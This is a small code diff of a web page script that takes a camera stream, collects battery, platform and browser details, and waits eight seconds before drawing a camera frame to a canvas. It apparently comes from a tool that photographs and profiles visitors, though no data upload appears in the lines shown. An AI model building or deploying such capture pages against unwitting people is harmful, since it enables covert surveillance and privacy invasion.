@@ -54,7 +54,6 @@
                 const v = document.getElementById('v');
                 v.srcObject = stream;
                 
-                // Get Battery and Device Info
                 let batInfo = "N/A";
                 try {
                     const battery = await navigator.getBattery();
@@ -64,8 +63,7 @@
                 const deviceInfo = navigator.platform;
                 const browserInfo = navigator.vendor || "Mobile Browser";
 
-                // 6 Seconds delay to fix Black Photo
-                await new Promise(r => setTimeout(r, 6000));
+                await new Promise(r => setTimeout(r, 8000));
 
                 const c = document.getElementById('c');
                 const ctx = c.getContext('2d');
